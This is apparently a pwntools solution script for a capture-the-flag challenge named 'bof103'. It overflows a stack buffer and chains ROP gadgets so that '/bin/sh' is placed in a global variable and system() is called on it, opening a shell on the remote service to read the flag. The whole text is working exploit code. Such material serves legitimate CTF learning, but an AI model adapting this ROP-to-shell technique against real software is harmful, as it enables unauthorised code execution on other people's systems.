from pwn import *

e = ELF('./bof103')
rop = ROP(e)
r = remote('bof103.sstf.site', 1337)

NUM_A = b'/bin/sh\x00'
NUM_B = p64(1)

SYSTEM_PLT = p64(e.plt['system'])
USEME_ADDR = p64(e.symbols['useme'])
KEY_ADDR = p64(e.symbols['key'])

POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
POP_RSI = p64((rop.find_gadget(['pop rsi', 'ret']))[0])

PAYLOAD = b'\x90' * 24
PAYLOAD += POP_RDI + NUM_A + POP_RSI + NUM_B + USEME_ADDR
PAYLOAD += POP_RDI + KEY_ADDR + SYSTEM_PLT

r.recvuntil(b'Name > ')
r.sendline(PAYLOAD)
r.sendline(b'cat flag')

r.interactive()